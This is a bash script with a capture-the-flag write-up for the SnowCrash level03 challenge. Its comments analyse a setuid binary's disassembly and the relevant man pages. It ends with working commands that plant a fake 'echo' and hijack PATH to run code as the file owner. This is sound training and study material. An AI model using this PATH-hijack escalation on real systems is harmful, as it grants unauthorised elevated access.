#!/bin/bash
# First, we do an ls -l to check the binary's permissions :
#
# level03@SnowCrash:~$ ls -l
# total 12
# -rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
# 
# We can see that the setuid and setgid bits are set, meaning executing the binary will be run with the file owner's privileges, here flag03.
#
# Using gdb, when disassembling the main, we get this code :
#
# Dump of assembler code for function main:
# 0x080484a4 <+0>:	push   %ebp
# 0x080484a5 <+1>:	mov    %esp,%ebp
# 0x080484a7 <+3>:	and    $0xfffffff0,%esp
# 0x080484aa <+6>:	sub    $0x20,%esp
# 0x080484ad <+9>:	call   0x80483a0 <getegid@plt>
# 0x080484b2 <+14>:	mov    %eax,0x18(%esp)
# 0x080484b6 <+18>:	call   0x8048390 <geteuid@plt>
# 0x080484bb <+23>:	mov    %eax,0x1c(%esp)
# 0x080484bf <+27>:	mov    0x18(%esp),%eax
# 0x080484c3 <+31>:	mov    %eax,0x8(%esp)
# 0x080484c7 <+35>:	mov    0x18(%esp),%eax
# 0x080484cb <+39>:	mov    %eax,0x4(%esp)
# 0x080484cf <+43>:	mov    0x18(%esp),%eax
# 0x080484d3 <+47>:	mov    %eax,(%esp)
# 0x080484d6 <+50>:	call   0x80483e0 <setresgid@plt>
# 0x080484db <+55>:	mov    0x1c(%esp),%eax
# 0x080484df <+59>:	mov    %eax,0x8(%esp)
# 0x080484e3 <+63>:	mov    0x1c(%esp),%eax
# 0x080484e7 <+67>:	mov    %eax,0x4(%esp)
# 0x080484eb <+71>:	mov    0x1c(%esp),%eax
# 0x080484ef <+75>:	mov    %eax,(%esp)
# 0x080484f2 <+78>:	call   0x8048380 <setresuid@plt>
# 0x080484f7 <+83>:	movl   $0x80485e0,(%esp)
# 0x080484fe <+90>:	call   0x80483b0 <system@plt>
# 0x08048503 <+95>:	leave
# 0x08048504 <+96>:	ret
# End of assembler dump.
# 
# We can see 5 call instructions, with these function names :
# - getegid
# - geteuid
# - setresgid
# - setresuid
# - system
# 
# This main() seems to get the process' effective GID, then its effective UID, then set its real,
# effective and saved GIDs then UIDs to specific values.
# Further down, when we reach this line in the execution of the program :
#
# => 0x080484fe <+90>:	call   0x80483b0 <system@plt>
#
# We inspect the content of the register %esp, to see the argument passed to system() :
#
# (gdb) print *(char**)$esp
# $14 = 0x80485e0 "/usr/bin/env echo Exploit me"
#
# We can guess that the original C code is :
#
# system("/usr/bin/env echo Exploit me");
#
# Taken from man system(3) :
#
# Description
# system() executes a command specified in command by calling /bin/sh -c command ...
#
# Taken from man sh(1) :
#
# > If the shell is started with the effective user (group) id not equal to the real user (group) id <, and the -p option is not supplied,
# no startup files are read, shell functions are not inherited from the environment, the SHELLOPTS, BASHOPTS, CDPATH, and GLOBIGNORE variables,
# if they appear in the environment, are ignored, and the effective user id is set to the real user id.
# 
# Taken from man env(1) :
# 
# Synopsis
# env [OPTION]... [-] [NAME=VALUE]... [COMMAND [ARG]...]
# 
# Description
# Set each NAME to VALUE in the environment and run COMMAND.
# 
# The translated shell call becomes :
# /bin/sh -c "/usr/bin/env echo Exploit me"
#
# So without setresuid(), calling system would reset the effective UID (3003) to the real UID (2003) of the calling process.
# The real UID of the calling process is :
#
# level03@SnowCrash:~$ id
# >>uid=2003(level03)<< gid=2003(level03) groups=2003(level03),100(users)
#
# Because of the setuid bit, the effective UID of the calling process becomes :
#
# level03@SnowCrash:~$ id flag03
# >>uid=3003(flag03)<< gid=3003(flag03) groups=3003(flag03),1001(flag)
# 
# With all this information, we guessed that we needed to find a way to execute a command on behalf of the file owner, flag03. 
# This mean we could bypass su's password checking and directly invoke getflag, or bash.
# Since this program uses env to execute a command, it means modifying the env could influence the behavior of the program.
# Since the binary invoked by env is echo, we're going to modify the PATH variable so that env finds a malicious version of echo first.
# This is how we did it (/var/crash is the first directory I found where I could create a file) :

echo -n "/bin/getflag" > /var/crash/echo # (on peut aussi choisir bash au lieu de getflag).
chmod +x /var/crash/echo
PATH=/var/crash ./level03
